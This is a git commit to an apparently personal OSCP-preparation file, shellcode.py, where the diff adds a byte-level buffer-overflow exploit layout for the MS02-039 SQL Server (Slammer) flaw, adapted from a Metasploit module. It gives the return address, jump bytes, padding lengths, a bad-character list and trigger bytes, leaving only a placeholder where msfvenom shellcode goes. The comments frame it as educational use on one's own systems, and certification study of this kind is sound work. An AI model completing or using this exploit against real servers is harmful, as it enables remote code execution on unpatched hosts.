ec5fb1385a79cbd573356a94a77d8e04a9838f74
John Solo <33820078+my4andle@users.noreply.github.com>
2018-06-27 16:58:45 -0600

    Update shellcode.py

--- shellcode.py
+++ shellcode.py
@@ -1,13 +1,19 @@
+# Use at your own risk with your own testing on your own systems
+# this is for educational use during OSCP certification
+
+
+# ms02_039 cliff notes
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/mssql/ms02_039_slammer.rb
-#Put your EXPLOIT CODE HERE and it can be imported into the framework for future use.
-#You will need to piece together the exploit code which includes your shellcode in conjunction with any other bytes required to trigger an overflow.  You can do this by reverse engineering known exploits found in msf or exploit-db.
-#Once you have working exploit code you can reuse here, but do not forget to create a handler for the specific shellcode.
-#This will help when you can not use metasploit.
-#Add print_status(Rex::Text.to_hex(buf)) to msf exploit to print your complete exploit code when executing
-#use msfvenom to create shellcode, and then combine this with other required exploit code
-
-
-ms02_039 = ("\x04\x41......."
-"\x90\x90.........")
-
+# add to msf exploit code to compare your bytes vs theirs: print_status(Rex::Text.to_hex(buf))
+# bad_chars = "\x00\x3a\x0a\x0d\x2f\x5c"
+ms02_039 = "\x04"
+ms02_039 += "\x41" * 95  # 95 random bytes see 
+ms02_039 += "\x74\x87\xb4\x42"  # return address little endian
+ms02_039 += "\x4f\x9f\x96\x40\x37\xf8"  # 6 byte nop sled? taken straight from msf exploit
+ms02_039 += "\xeb\x08"  # jump 8 bytes
+ms02_039 += "\xcc\xe0\xfd\x7f\xcc\xe0\xfd\x7f"
+ms02_039 += "<your shellcode>"  # your msfvenom generated shellcode, dont forget to math on next line
+ms02_039 += "\x41" * 322  # length adjusted based on your shellcode length, final payload to be 806 bytes
+ms02_039 += "\x68\x3a\x38\x38\x38"  # end trigger
+         
 
